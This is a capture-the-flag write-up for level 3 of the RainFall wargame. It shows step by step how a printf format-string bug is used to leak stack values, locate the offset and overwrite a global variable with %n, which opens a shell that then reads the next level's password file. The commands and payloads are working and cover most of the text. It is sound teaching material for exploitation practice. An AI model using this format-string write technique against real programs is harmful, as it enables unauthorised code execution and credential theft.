# Level 3

In this level we can see that we need to edit the value of the variable `m` to `0x40` in order to get a shell.
```asm
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
```
The input is read with the secure function `fgets`, our exploit lies elsewhere, in `printf`.

## The exploit
```shell
level3@RainFall:~$ ./level3 
%p %p %p %p
0x200 0xb7fd1ac0 0xb7ff37d0 0x25207025
```
Odd, we're getting the value of the argument of fgets and what strongly looks like stack addresses, which means....

Since we know that the ascii value of 0 is `0x30`, let's try inserting a bunch of 0 at the start of our buffer:
```shell
level3@RainFall:~$ python -c 'print "0000" + "%p "*10' | ./level3
00000x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```
We can see that the 4th pointer gets modified by our printf format string as it's made of four zeroes (0x30303030), nice!

Let's simplify our string a bit now that we know which argument we can act on

```shell
level3@RainFall:~$ python -c 'print "0000%4$p"' | ./level3
00000x30303030
```

## Inserting the address
```shell
level3@RainFall:~$ objdump -t ./level3  | grep m
[...]
0804988c g     O .bss   00000004              m
[...]
```
the value of `m` is `0x804988c`, we can get it from `gdb`, `r2`, `objdump` or ghidra.

Let's insert it as a value.
```shell
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%4$p"' | ./level3
0x804988c
```

#### note about struct.pack
struct.pack adds extra padding as we can see with hexdump:

```shell
level3@RainFall:~$ python -c 'import struct; print struct.pack("<Q", 0x804988c) + "%4$p"' | hexdump -C
00000000  8c 98 04 08 00 00 00 00  25 34 24 70 0a           |........%4$p.|
0000000d
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%4$p"'  | hexdump -C
00000000  8c 98 04 08 25 34 24 70  0a                       |....%4$p.|
00000009
```
This is why we write `0x804988c` in little-endian manually.

## Modifying memory
Now that we have access to the address of `m`, we can use `%n` to write a number to it as the BUG section of `printf` man tells us. 
The flag `%n` writes the number of character written so far to the pointer passed as argument, perfect to modify the value of `m`!

Since our format string is 4 bytes long, we need to add 60 more bytes

```shell
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' | ./level3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
```

We won! we just need to find a way to keep the shell open now.

## Putting it together

Let's send `cat` on stdin after our format string to keep the shell open
```shell
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' ; cat -) | ./level3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
cat /home/user/level4/.pass
[censored]
```
Done!
